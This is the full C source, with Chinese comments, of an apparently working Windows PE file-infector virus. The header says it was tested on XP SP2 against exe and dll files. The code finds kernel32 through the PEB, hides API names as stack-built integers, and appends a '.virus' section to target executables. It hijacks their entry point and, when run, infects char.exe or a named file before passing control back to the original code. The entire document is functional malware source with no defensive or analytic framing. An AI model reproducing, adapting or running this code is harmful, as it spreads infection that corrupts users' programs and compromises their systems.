// 在VC6.0编译器下编译通过，并在xp sp2下成功感染exe和dll文件 
// 病毒长度3296字节 

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

//#define _DEBUG_

#define WORD4(a,b,c,d) ((a)+(b)*0x100+(c)*0x10000+(d)*0x1000000)
#define ALIGN(a,b) (((a-1) | (b-1))+1)

#pragma warning(disable:4996)

// UNICODE_STRING在获取kernel32.dll时要使用，系统的核心结构体（PEB）使用UNICODE编码 
#ifndef UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef LSA_UNICODE_STRING UNICODE_STRING, *PUNICODE_STRING;
#endif

//指向函数的指针定义 
typedef void *(*FNReLocal)(void *start);
typedef DWORD(*FNGetKrnlBase)(void); //获取Kernel32.dll的基地址
typedef int(*FNMyStrLen)(const char *pStr);
typedef int(*FNMyStrCmp)(const char *str1, const char *str2);
typedef void(*FNMyStrCpy)(char *dst, const char *src);
typedef void(*FNMyStrCat)(char *dst, const char *src);
typedef DWORD(*FNGetApiAddr)(DWORD dwBaseAddr, const char *strAPI);
typedef struct tagFUNC *LPFUNC;
typedef int(*FNSeekAndRead)(LPFUNC, HANDLE, int, char *, int);
typedef int(*FNSeekAndWrite)(LPFUNC, HANDLE, int, const char *, int);
typedef int(*FNinfect)(LPFUNC, const char *);
typedef void(*FNLastFun)(void);
//////////////////////////////////////////////////////////////////////////
typedef HANDLE(WINAPI *FNCreateFile)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *FNCloseHandle)(HANDLE);
typedef BOOL(WINAPI *FNReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *FNWriteFile)(HANDLE, const void *, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD(WINAPI *FNSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef DWORD(WINAPI *FNGetFileSize)(HANDLE, LPDWORD);
typedef FARPROC(WINAPI *FNGetProcAddress)(HMODULE, const char *);
typedef HINSTANCE(WINAPI *FNLoadLibrary)(const char*);
typedef void (WINAPI *FNExitProcess)(UINT);
typedef int (WINAPI *FNMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);
typedef HMODULE(WINAPI *FNGetModuleHandle)(LPCTSTR);
typedef BOOL(WINAPI *FNFreeLibrary)(HMODULE);
typedef BOOL(WINAPI *FNSetEndOfFile)(HANDLE);
typedef DWORD(WINAPI *FNGetTickCount)(void); //
typedef HANDLE(WINAPI *FNCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
	LPVOID, DWORD, LPDWORD);

//相当于导入表了 
typedef struct tagFUNC
{
	FNReLocal _ReLocal;
	FNGetKrnlBase _GetKrnlBase;
	FNMyStrLen _MyStrLen;
	FNMyStrCmp _MyStrCmp;
	FNMyStrCpy _MyStrCpy;
	FNMyStrCat _MyStrCat;
	FNGetApiAddr _GetApiAddr;
	FNSeekAndRead _SeekAndRead;
	FNSeekAndWrite _SeekAndWrite;
	FNinfect _infect;
	FNLastFun _LastFun;
	//////////////////////////////////////////////////////////////////////////
	FNCreateFile _CreateFile;
	FNCloseHandle _CloseHandle;
	FNReadFile _ReadFile;
	FNWriteFile _WriteFile;
	FNSetFilePointer _SetFilePointer;
	FNGetFileSize _GetFileSize;
	FNGetProcAddress _GetProcAddress;
	FNLoadLibrary _LoadLibrary;
	FNExitProcess _ExitProcess;
	FNMessageBox _MessageBox;
	FNGetModuleHandle _GetModuleHandle;
	FNFreeLibrary _FreeLibrary;
	FNSetEndOfFile _SetEndOfFile;
} FUNC, *LPFUNC;

//函数的提前声明 
BOOL WINAPI MyEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
void *ReLocal(void *start); //重定位函数
DWORD GetKrnlBase(void); //获取Kernel32.dll的基地址
int MyStrLen(const char *pStr);
int MyStrCmp(const char *str1, const char *str2);
void MyStrCpy(char *dst, const char *src);
void MyStrCat(char *dst, const char *src);
DWORD GetApiAddr(DWORD dwBaseAddr, const char *strAPI);
int SeekAndRead(LPFUNC func, HANDLE file, int offset, char *buffer, int size);
int SeekAndWrite(LPFUNC func, HANDLE file, int offset, const char *buffer, int size);
int infect(LPFUNC func, const char *name);
void LastFun(void);

//此函数相当于DLL的DllMain函数 
BOOL WINAPI MyEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	FUNC func;
	DWORD dwBase, dwKrnlBase, dwBaseUser32, dwBaseGdi32, dwOriEntryPoint;
	char szFileName[260] = { 0 };
	//所有的dll 和 dll中的api函数名，我们全部在堆栈建立它 
	DWORD dwUser32dll[] = { 'resu', 'd.23', 'll' }; //"User32.dll"
	DWORD dwGdi32dll[] = { '3idg', 'ld.2', 'l' };
	DWORD dwCreateFile[] = { 'aerC', 'iFet', 'Ael' }; //"CreateFileA"字符串编码 
	DWORD dwCloseHandle[] = { 'solC', 'naHe', 'eld' };
	DWORD dwReadFile[] = { 'daeR', 'eliF', 0 };
	DWORD dwWriteFile[] = { 'tirW', 'liFe', 'e' };
	DWORD dwSetFilePointer[] = { 'FteS', 'Peli', 'tnio', 're' };
	DWORD dwGetFileSize[] = { 'FteG', 'Seli', 'ezi' };
	DWORD dwGetProcAddress[] = { 'PteG', 'Acor', 'erdd', 'ss' };
	DWORD dwLoadLibrary[] = { 'daoL', 'rbiL', 'Ayra', 0 };
	DWORD dwExitProcess[] = { 'tixE', 'corP', 'sse' };
	DWORD dwMessageBox[] = { 'sseM', 'Bega', 'Axo' };
	DWORD dwGetModuleHandle[] = { 'MteG', 'ludo', 'naHe', 'Aeld', 0 };
	DWORD dwFreeLibrary[] = { 'eerF', 'rbiL', 'yra' };
	DWORD dwSetEndOfFile[] = { 'EteS', 'fOdn', 'eliF', 0 };
	__asm //用于重定位
	{
		call label1
		label1 : pop ebx
				 sub ebx, offset label1
				 mov dwBase, ebx
	}
	func._ReLocal = (FNReLocal)(dwBase + (DWORD)ReLocal); //获取ReLocal函数真实地址,下同 
	func._GetKrnlBase = (FNGetKrnlBase)(dwBase + (DWORD)GetKrnlBase);
	func._MyStrLen = (FNMyStrLen)(dwBase + (DWORD)MyStrLen);
	func._MyStrCmp = (FNMyStrCmp)(dwBase + (DWORD)MyStrCmp);
	func._MyStrCpy = (FNMyStrCpy)(dwBase + (DWORD)MyStrCpy);
	func._MyStrCat = (FNMyStrCat)(dwBase + (DWORD)MyStrCat);
	func._GetApiAddr = (FNGetApiAddr)(dwBase + (DWORD)GetApiAddr);
	func._SeekAndRead = (FNSeekAndRead)(dwBase + (DWORD)SeekAndRead);
	func._SeekAndWrite = (FNSeekAndWrite)(dwBase + (DWORD)SeekAndWrite);
	func._infect = (FNinfect)(dwBase + (DWORD)infect);
	func._LastFun = (FNLastFun)(dwBase + (DWORD)LastFun);
#ifdef _DEBUG_	
	printf("%X, %X, %X, %X, %X, %X, %X\n", func._ReLocal, func._GetKrnlBase,
		func._MyStrLen, func._MyStrCmp, func._MyStrCpy, func._MyStrCat, func._GetApiAddr);
	printf("%X, %X, %X, %X, %X, %X, %X\n", ReLocal, GetKrnlBase, MyStrLen,
		MyStrCmp, MyStrCpy, MyStrCat, GetApiAddr);
#endif

	dwKrnlBase = func._GetKrnlBase(); //获取kernel32.dll映像基址 
	// kernel32.dll里的api 
	func._CreateFile = (FNCreateFile)func._GetApiAddr(dwKrnlBase, (char *)dwCreateFile);
	func._CloseHandle = (FNCloseHandle)func._GetApiAddr(dwKrnlBase, (char *)dwCloseHandle);
	func._ReadFile = (FNReadFile)func._GetApiAddr(dwKrnlBase, (char *)dwReadFile);
	func._WriteFile = (FNWriteFile)func._GetApiAddr(dwKrnlBase, (char *)dwWriteFile);
	func._SetFilePointer = (FNSetFilePointer)func._GetApiAddr(dwKrnlBase, (char *)dwSetFilePointer);
	func._GetFileSize = (FNGetFileSize)func._GetApiAddr(dwKrnlBase, (char *)dwGetFileSize);
	func._GetProcAddress = (FNGetProcAddress)func._GetApiAddr(dwKrnlBase, (char *)dwGetProcAddress);
	func._LoadLibrary = (FNLoadLibrary)func._GetApiAddr(dwKrnlBase, (char *)dwLoadLibrary);
	func._ExitProcess = (FNExitProcess)func._GetApiAddr(dwKrnlBase, (char *)dwExitProcess);
	func._GetModuleHandle = (FNGetModuleHandle)func._GetApiAddr(dwKrnlBase, (char *)dwGetModuleHandle);
	func._FreeLibrary = (FNFreeLibrary)func._GetApiAddr(dwKrnlBase, (char *)dwFreeLibrary);
	func._SetEndOfFile = (FNSetEndOfFile)func._GetApiAddr(dwKrnlBase, (char *)dwSetEndOfFile);

	// user32.dll里的api
	dwBaseUser32 = (DWORD)func._LoadLibrary((char *)dwUser32dll);
	func._MessageBox = (FNMessageBox)func._GetApiAddr(dwBaseUser32, (char *)dwMessageBox);

	// gdi32.dll里的api
	dwBaseGdi32 = (DWORD)func._LoadLibrary((char *)dwGdi32dll);

	*(DWORD*)&szFileName[0] = WORD4('c', 'h', 'a', 'r');
	*(DWORD*)&szFileName[4] = WORD4('.', 'e', 'x', 'e');
	func._MessageBox(NULL, szFileName, NULL, 0); //弹出消息框 
	func._infect(&func, szFileName); //感染szFileName所指定的文件 

	// 释放内存
	func._FreeLibrary((HMODULE)dwBaseGdi32);
	func._FreeLibrary((HMODULE)dwBaseUser32);
	dwOriEntryPoint = *(DWORD*)func._LastFun;
	if (*((DWORD*)func._LastFun + 1)) //若是DLL文件
		dwOriEntryPoint += (DWORD)hinstDLL;
	else
		dwOriEntryPoint += (DWORD)func._GetModuleHandle(NULL);
	//	__try
	//	{

	BOOL(WINAPI *MainDLL)(HANDLE, DWORD, LPVOID) = (BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))dwOriEntryPoint;
	return MainDLL(hinstDLL, fdwReason, lpvReserved); //跳转到被感染的文件的原始的入口继续执行 
	//	}
	//	__except(EXCEPTION_EXECUTE_HANDLER)
	//	{}
}

//用于重定位的函数 
void *ReLocal(void *start)
{
	__asm
	{
		call label1
		label1 : pop eax
				 sub eax, offset label1
				 add eax, start
	}
}

//获取kernel32.dll在内存的地址 
DWORD GetKrnlBase(void)
{
	//不使用下面注释的代码获取Kernel32.dll的基址，因为此代码在Windows7下获取的并不是kernel32.dll的基地址 
	//	__asm
	//	{
	//		mov eax, fs:[30h] ;//Get PEB
	//		mov eax, [eax+0ch] ;//Get _PEB_LDR_DATA
	//		mov eax, [eax+1ch] ;//Get InInitializationOrderModuleList.Flink, 
	//		;//此时eax指向的是ntdll模块的InInitializationOrderModuleList线性地址。
	//		;//所以我们获得它的下一个则是kernel32.dll
	//		mov eax, [eax]
	//		mov eax, [eax+8h];//8 = sizeof.LIST_ENTRY
	//	}
	DWORD dwKernel32_dll[] = { WORD4('k', 'e', 'r', 'n'), WORD4('e', 'l', '3', '2'), WORD4('.', 'd', 'l', 'l'), 0 };
	USHORT usLen = 12;
	PBYTE pb, pt;
	__asm
	{
		mov ebx, fs:[30h];//Get PEB
		mov ebx, [ebx + 0ch];//Get _PEB_LDR_DATA
		mov ebx, [ebx + 1ch];//Get InInitializationOrderModuleList.Flink, 
		mov pb, ebx;
	}
	pt = pb;
	do
	{
		PUNICODE_STRING pwStr = (PUNICODE_STRING)(DWORD *)(pb + 0x1c); //获取dll的名称 
		//wprintf(L"Len=%d, name=%s", pwStr->Length, pwStr->Buffer) ;
		//printf(" Address=%X\n", *(DWORD *)(pb+8)) ;
		// 接下来要做的就是，判断dll的名称是不是“kernel32.dll” 
		if (pwStr->Length == 24)
		{
			int i, j;
			for (i = 0, j = 0; i<12; ++i)
			{
				j = ((char *)dwKernel32_dll)[i] - pwStr->Buffer[i];
				if (j != 0 && j != 32) break;
			}
			if (i == 12)
				return *(DWORD *)(pb + 8); //返回kernel32.dll的基地址
		}
		pb = (PBYTE)*(DWORD *)pb;
	} while (pb != pt);
	return 0;
}

// 自己的strlen函数 
int MyStrLen(const char *pStr)
{
	int iLen = 0;
	while (*pStr++) iLen++;
	return iLen;
}

// 自己的strcmp函数 
int MyStrCmp(const char *str1, const char *str2)
{
	int i;
	if (!str1 && !str2)
		return 0;
	if (!str1) return -1;
	if (!str2) return 1;
	while (*str1 && *str2)
	{
		i = (*str1++) - (*str2++);
		if (i > 0) return 1;
		else if (i < 0) return -1;
	}
	if (*str1) return 1;
	if (*str2) return -1;
	return 0;
}

// 自己的strcpy函数 
void MyStrCpy(char *dst, const char *src)
{
	while (*dst++ = *src++);
}


//自己的strcat函数 
void MyStrCat(char *dst, const char *src)
{
	while (*dst) dst++;
	strcpy(dst, src);/////////////////////////////////////////////
}

//获取api的地址
// dwBaseAddr是dll载入内存后的地址 strAPI是函数名 
DWORD GetApiAddr(DWORD dwBaseAddr, const char *strAPI)
{
	IMAGE_DOS_HEADER *pidh = NULL;
	IMAGE_NT_HEADERS *pinh = NULL;
	IMAGE_DATA_DIRECTORY *pSymbolTable = NULL;
	IMAGE_EXPORT_DIRECTORY *pied = NULL;
	int NumberOfNames, i;
	char *pName = NULL;

	if (!strAPI) return 0;
	pidh = (IMAGE_DOS_HEADER *)dwBaseAddr;
	pinh = (IMAGE_NT_HEADERS *)((DWORD)dwBaseAddr + pidh->e_lfanew);
	pSymbolTable = &pinh->OptionalHeader.DataDirectory[0];
	pied = (IMAGE_EXPORT_DIRECTORY *)((DWORD)dwBaseAddr + pSymbolTable->VirtualAddress);
#ifdef _DEBUG_
	printf("NumberOfNames=0x%X, NumberOfFunctions=0x%X\n", pied->NumberOfNames, pied->NumberOfFunctions);
	printf("Base = %X\n", pied->Base);
	printf("Name = %s\n", dwBaseAddr + pied->Name); // "kernel32.dll"
#endif
	NumberOfNames = pied->NumberOfNames;
	for (i = 0; i<NumberOfNames; ++i)
	{
#ifdef _DEBUG_
		printf("Ori=%04X, ", *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i) + pied->Base);
		printf("Name=%s, ", dwBaseAddr + *((DWORD *)(dwBaseAddr + pied->AddressOfNames) + i));
		printf("Address=%X\n", dwBaseAddr + (*((DWORD *)(dwBaseAddr + pied->AddressOfFunctions) + *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i))));
#endif
		pName = (char *)(dwBaseAddr + *((DWORD *)(dwBaseAddr + pied->AddressOfNames) + i)); //函数地址
		if (MyStrCmp(strAPI, pName) == 0)
			return dwBaseAddr + (*((DWORD *)(dwBaseAddr + pied->AddressOfFunctions) + *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i)));
	}
	return 0;
}

// 定位到指定的位置，再读取文件 
int SeekAndRead(LPFUNC pfunc, HANDLE hFile, int offset, char *buffer, int size)
{
	unsigned long len;
	pfunc->_SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
	if (!pfunc->_ReadFile(hFile, buffer, size, &len, NULL))
		return 0;
	return len;
}

// 定位到指定的位置，再写入文件
int SeekAndWrite(LPFUNC pfunc, HANDLE hFile, int offset, const char *buffer, int size)
{
	unsigned long len;
	pfunc->_SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
	if (!pfunc->_WriteFile(hFile, buffer, size, &len, NULL))
		return 0;
	return len;
}


//感染PE文件的函数，name制定PE文件名
int infect(LPFUNC pfunc, const char *name)
{
	HANDLE hFile;
	int res = 0;
	// MS-DOS头部64个字节   object保存节头信息的缓冲区（40个字节）
	char MZ[0x40], PE[0x100], object[0x28];
	unsigned pe_header; //指向PE文件头

	hFile = pfunc->_CreateFile(name, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return 0;
	if (pfunc->_SeekAndRead(pfunc, hFile, 0, MZ, 0x40)) //读取MS-DOS头部
	{
		// 定位PE文件头部并读取以PE文件头部开始的256字节，保存于缓冲区PE中
		if (pfunc->_SeekAndRead(pfunc, hFile, pe_header = *(unsigned*)(MZ + 0x3C), PE, 0x100))
		{
			// PE+8 指向TimeDateStamp 文件建立的时间(当标志位)
			if (*(unsigned*)(PE + 8) != 0x98765432 && *(unsigned*)PE == WORD4('P', 'E', 0, 0))
			{
				// *(unsigned short*)(PE+0x14)可选头的长度  pe_header+0x18刚好指向可选头的第一个成员
				// o_object的值为（第一个）节头的偏移量
				unsigned o_object = pe_header + *(unsigned short*)(PE + 0x14) + 0x18;

				// *(unsigned short*)(PE+6)为节的数量。 0x28为节头的大小
				if (pfunc->_SeekAndRead(pfunc, hFile, o_object + *(unsigned short*)(PE + 6) * 0x28, object, 0x28))
				{
					int i;
					char r;
					for (r = i = 0; i < 0x28; i++)
						r |= object[i]; //
					// 若还有空间可以添加一个新的节头
					if (!r)
					{
						DWORD dwOldEntryPoint = 0;
						for (unsigned short k = 0; k < *(unsigned short*)(PE + 6); k++)
						{
							pfunc->_SeekAndRead(pfunc, hFile, o_object + k * 0x28, object, 0x28);
							object[0x27] |= 0xC0; //改变Characteristics节属性
							//更新文件
							pfunc->_SeekAndWrite(pfunc, hFile, o_object + k * 0x28, object, 0x28);
						}
						*(unsigned*)(PE + 8) = 0x98765432;

						// 添加名字为.virus的新节
						*(unsigned*)(object) = WORD4('.', 'v', 'i', 'r');
						*(unsigned*)(object + 4) = WORD4('u', 's', 0, 0);

						unsigned virsize = (unsigned)LastFun - (unsigned)MyEntryPoint,
							// *(unsigned*)(PE+0x38) 段加载后在内存中的对齐方式
							virtsize = ALIGN(virsize + 8, *(unsigned*)(PE + 0x38)), //加8字节，4字节原始的入口，4字节存储被感染的是不是DLL文件 
							// *(unsigned*)(PE+0x50)-->SizeOfImage
							startRVA = *(unsigned*)(PE + 0x50), //病毒节的起始位置
							// *(unsigned*)(PE+0x3c) 段在文件中的对齐方式
							physsize = ALIGN(virsize + 8, *(unsigned*)(PE + 0x3c)),
							FileSize = ALIGN(pfunc->_GetFileSize(hFile, NULL), *(unsigned*)(PE + 0x3c));

						//dwOldEntryPoint = *(unsigned*)(PE+0x34) ; //ImageBase映象基址 

						*(unsigned*)(object + 8) = virtsize;    //节的真实长度
						*(unsigned*)(object + 0x0c) = startRVA; //节的RVA
						*(unsigned*)(object + 0x10) = physsize; //节的物理长度
						*(unsigned*)(object + 0x14) = FileSize; //节基于文件的偏移量
						//节属性
						*(unsigned*)(object + 0x24) = 0xE0000020; // flags: code section, read, write, execute

						//*(unsigned*)(PE+0x1c) += physsize; // sizeof code
						//*(unsigned*)(PE+0x20) += physsize; // Size Of InitialishedData
						*(unsigned*)(PE + 0x50) += virtsize; //*(unsigned*)(PE+0x50)程序调入后占用内存大小
						dwOldEntryPoint = *(unsigned*)(PE + 0x28);
						*(unsigned*)(PE + 0x28) = startRVA; /*改写程序的入口点*/
						pfunc->_SeekAndWrite(pfunc, hFile, o_object + *(unsigned short*)(PE + 6) * 0x28, object, 0x28); //写入新节头
						(*(unsigned short*)(PE + 6))++; // 节数量加1

						pfunc->_SeekAndWrite(pfunc, hFile, pe_header, PE, 0x100);
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize, (char*)pfunc->_ReLocal(MyEntryPoint), virsize);
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize + virsize, (char*)&dwOldEntryPoint, 4); //写入被感染的文件的原始入口 
						i = 0;
						if (*(USHORT*)(PE + 0x16) & IMAGE_FILE_DLL) // Characteristics
							i = 0xd11; //说明被感染的可执行文件是DLL（动态链接库文件）
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize + virsize + 4, (char*)&i, 4);
						pfunc->_SetFilePointer(hFile, FileSize + physsize, NULL, FILE_BEGIN);
						pfunc->_SetEndOfFile(hFile);
						res = 1;
					}
				}
			}
		}
	}
	pfunc->_CloseHandle(hFile);
	return res;
}

void LastFun(void) {} //标志病毒体到此结束 

int main(int argc, char *argv[])
{
	FUNC func;
#ifdef _DEBUG_
	printf("%X, %X, %X, %X, %X, %X, %X, %X, %X, %X, %X\n",
		ReLocal, GetKrnlBase, MyStrLen, MyStrCmp, MyStrCpy, MyStrCat,
		GetApiAddr, SeekAndRead, SeekAndWrite, infect, LastFun);
#endif
	if (argc < 2)
	{
		printf("Useage: %s [exefile | dllfile]\n", argv[0]);
		return 0;
	}
	func._ReLocal = ReLocal;
	func._GetKrnlBase = GetKrnlBase;
	func._MyStrLen = MyStrLen;
	func._MyStrCmp = MyStrCmp;
	func._MyStrCpy = MyStrCpy;
	func._MyStrCat = MyStrCat;
	func._GetApiAddr = GetApiAddr;
	func._SeekAndRead = SeekAndRead;
	func._SeekAndWrite = SeekAndWrite;
	func._infect = infect;
	func._LastFun = LastFun;
	func._CreateFile = CreateFileA;
	func._CloseHandle = CloseHandle;
	func._ReadFile = ReadFile;
	func._WriteFile = WriteFile;
	func._SetFilePointer = SetFilePointer;
	func._GetFileSize = GetFileSize;
	func._GetProcAddress = GetProcAddress;
	func._LoadLibrary = LoadLibraryA;
	func._ExitProcess = ExitProcess;
	func._MessageBox = MessageBoxA;
	func._GetModuleHandle = GetModuleHandleA;
	func._FreeLibrary = FreeLibrary;
	func._SetEndOfFile = SetEndOfFile;
	infect(&func, argv[1]); //对参数指定的文件进行感染 
	return 0;
}
